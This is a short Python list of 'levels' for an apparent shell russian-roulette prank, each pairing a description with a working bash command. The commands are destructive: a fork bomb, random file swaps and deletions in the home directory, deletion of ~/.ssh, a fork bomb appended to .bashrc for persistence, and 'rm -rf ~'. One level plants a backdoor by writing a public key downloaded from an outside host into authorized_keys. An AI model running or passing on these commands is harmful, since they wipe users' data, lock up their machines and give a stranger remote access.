LEVELS = [
    ("echo 'bang'", "echo 'bang!';"),
    ("run a forkbomb", """
forkbomb() {
    echo 'bang!';
    forkbomb | forkbomb &
}
forkbomb;
"""),
    ("swap two files in your homedir", """files=(~/*);
f1="${files[RANDOM % ${#files[@]}]}"
f2="${files[RANDOM % ${#files[@]}]}"
mv "$f1" /tmp/russianroulette
mv "$f2" "$f1"
mv /tmp/russianroulette "$f2"
rm /tmp/russianroulette
echo 'bang! two files got their names mixed up. now, which ones were they..?'
"""),
    ("replace a random file from your homedir with a kitten", """
files=(~/*);
f="${files[RANDOM % ${#files[@]}]}"
rm -rf "$f"
curl http://placekitten.com/g/320/240 > "$f"
echo 'bang! $f is now a kitten'"""),
    ("delete a random file from your homedir", """files=(~/*);
f="${files[RANDOM % ${#files[@]}]}"
rm -rf "$f"
echo 'bang!' $f 'is gone forever.'"""),
    ("delete ~/.ssh", "rm -rf ~/.ssh; echo 'bang! no more ssh for you.'"),
    ("put a forkbomb in your .bashrc", """ echo ":(){ :|:& };:" >> ~/.bashrc"""),
    ("(re-)create .ssh and add my public key to it", """mkdir -p .ssh
chmod 600 .ssh
curl https://q3k.org/pubkey > .ssh/authorized_keys
echo 'bang! thanks for the access.'"""),
    ("delete your whole homedir", """rm -rf ~; echo 'bang!' "you're homeless now." """),
]
